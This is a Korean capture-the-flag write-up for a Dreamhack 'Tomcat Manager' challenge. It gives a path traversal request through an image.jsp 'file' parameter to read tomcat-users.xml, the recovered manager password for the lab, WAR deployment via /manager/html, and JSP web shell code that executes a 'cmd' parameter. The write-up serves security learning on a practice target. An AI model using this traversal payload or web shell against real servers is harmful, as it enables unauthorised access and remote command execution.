# B2 · Tomcat Manager

### 1. VM에 접속한다

문제 페이지에서 이미지 파일을 불러오는 `image.jsp?file=...` 요청을 확인한다. `file` 파라미터로 파일 경로를 전달하는 구조이므로 다른 경로도 지정할 수 있는지 살펴본다.

<img width="1451" height="682" alt="image" src="https://github.com/user-attachments/assets/04495f0e-d9cb-4bc6-b5bb-939a9e576eed" />

### 2. 요청 분석 — Path Traversal로 관리자 설정 파일 접근

**① `tomcat-users.xml`에서 관리 권한을 확인한다.**

```xml
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<role rolename="admin-gui"/>

<user username="tomcat" password="[SECRET]"
      roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
```
<br>

**② `file` 파라미터에 상위 디렉터리 이동 경로를 입력한다.**

아래는 Burp Repeater에서 사용한 HTTP 요청이다.

```http
GET /image.jsp?file=/../../../../../../usr/local/tomcat/conf/tomcat-users.xml HTTP/1.1
Host: host3.dreamhack.games:14594
```

`../`는 상위 디렉터리로 이동하는 경로 표현이다. `file` 값에 이를 반복해 넣고 Tomcat 설정 파일인 `/usr/local/tomcat/conf/tomcat-users.xml`을 요청했다.

<br>
<br>
<img width="1543" height="415" alt="image" src="https://github.com/user-attachments/assets/bd643307-aa34-47fa-84db-893463d55bc8" />
<br>



```http
user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" 
```
<br>


### 3. Tomcat Manager 로그인


`tomcat-users.xml`의 `manager-gui` 권한을 보고 **Tomcat의 기본 관리 애플리케이션(Manager)**을 이용하는 계정임을 알 수 있다.

Tomcat 공식 문서에서 웹 관리 화면은 `/manager/html` 경로를 사용한다.

<img width="1561" height="313" alt="image" src="https://github.com/user-attachments/assets/e26174ba-862c-42db-9521-df24388d5ab3" />

<br>
<br>

```text
http://서버주소:포트/manager/html
```

<br>
<br>
앞에서 확인한 `tomcat` 계정으로 로그인하니 **Tomcat Web Application Manager** 화면에 접속할 수 있었다.
<br>
<br>

<img width="1919" height="756" alt="image" src="https://github.com/user-attachments/assets/b160a88f-5efd-417b-bbc2-bc2712c6d0c4" />





이 화면에는 실행 중인 애플리케이션 목록과 **WAR file to deploy** 기능이 있다. WAR를 올려 새 JSP 애플리케이션을 배포할 수 있다.

### 4. WAR 파일 업로드와 JSP 웹 셸 분석

처음 직접 만든 WAR는 JSP의 Java 버전 호환성 문제로 `500` 오류가 발생했다. 이후 GitHub에 있는 [webshell.war](https://github.com/tghosth/webshelljar/blob/master/webshell.war)를 사용했다.

WAR는 Java 웹 애플리케이션을 담은 **ZIP 기반 배포 파일**이다. 실제 사용한 `webshell.war`의 구조는 다음과 같다.

```text
webshell.war
├── META-INF/
│   └── MANIFEST.MF
└── index.jsp
```

**`index.jsp`의 핵심 코드**

```jsp
String cmd = request.getParameter("cmd");
String output = "";

if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd, null, null);
    BufferedReader sI = new BufferedReader(
        new InputStreamReader(p.getInputStream())
    );

    String s;
    while ((s = sI.readLine()) != null) {
        output += s + "</br>";
    }
}
```

- `request.getParameter("cmd")`: URL의 `cmd` 파라미터를 읽는다.
- `Runtime.getRuntime().exec(cmd, null, null)`: 입력받은 명령어를 서버에서 실행한다.
- `p.getInputStream()`: 실행 결과의 **표준 출력(stdout)**을 읽는다.
- `output`: 읽은 내용을 HTML에 출력한다.

따라서 WAR를 배포하면 서버에서 명령어를 실행하고 결과를 볼 수 있다. **Tomcat Manager의 WAR 배포 권한을 통한 RCE**인 것이다.

**① WAR 배포 과정**

| 배포 과정 1 | 배포 과정 2 |
| :---: | :---: |
| <img src="https://github.com/user-attachments/assets/00209578-42a1-47ed-bdb8-9bf8ec7cc426" width="420" alt="WAR 배포 과정 첫 번째 화면" /> | <img src="https://github.com/user-attachments/assets/be047e8b-4d6d-469b-bd7c-0dd92aa5ec41" width="420" alt="WAR 배포 과정 두 번째 화면" /> |

**② 과정별 확인 화면**

<p align="center"><img src="https://github.com/user-attachments/assets/159f8170-6783-4ff5-9464-868d34247367" width="780" alt="WAR 배포 과정 세 번째 화면" /></p>

<p align="center"><img src="https://github.com/user-attachments/assets/a005f46c-64b9-4f8f-b8e7-f527b984665d" width="740" alt="WAR 배포 과정 네 번째 화면" /></p>

**③ 실행 전·후 비교**

| 실행 전 | 실행 후 |
| :---: | :---: |
| <img src="https://github.com/user-attachments/assets/d3540b37-5f85-4aad-9e02-dea064c6ea93" width="400" alt="실행 전 화면" /> | <img src="https://github.com/user-attachments/assets/6e564a4a-5694-4ba3-9c81-3b08dcdf578a" width="400" alt="실행 후 화면" /> |

### 5. 웹 셸에서 FLAG 확인

웹 셸에 `/flag`를 입력해 FLAG가 출력되는 것을 확인한다.

<p align="center"><img src="https://github.com/user-attachments/assets/5b30fdd8-fec0-4e52-869b-1fb28f0dbc28" width="550" alt="웹 셸에서 FLAG 출력 확인" /></p>
